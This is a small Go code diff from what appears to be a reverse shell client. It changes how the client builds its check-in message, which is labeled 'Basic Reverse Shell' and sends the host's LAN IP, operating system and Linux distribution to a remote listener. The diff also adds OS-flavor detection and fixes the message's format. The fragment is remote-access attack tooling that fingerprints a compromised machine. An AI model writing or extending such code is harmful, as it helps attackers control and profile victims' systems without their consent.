@@ -29,14 +29,17 @@ func GetPort() string {
 	// ip := GetOutboundIP()
 	osFlavor := "n/a"
 	// TODO: add OS flavor
-
+	if runtime.GOOS == "linux" {
+		osFlavor = getOS()
+	}
+	fmt.Println(runtime.GOOS)
 	it, err := getPort.Write([]byte(
 		"INFO:{clientType:Basic Reverse Shell," +
 			"lanIP:" + GetOutboundIP() + "," +
-			"isEncoded:false" +
-			"os:" + runtime.GOOS +
+			"isEncoded:false" + "," +
+			"os:" + runtime.GOOS + "," +
 			"osFlavor:" + osFlavor +
-			"\n",
+			"}\n",
 	))
 	if err != nil {
 		fmt.Println(err.Error())
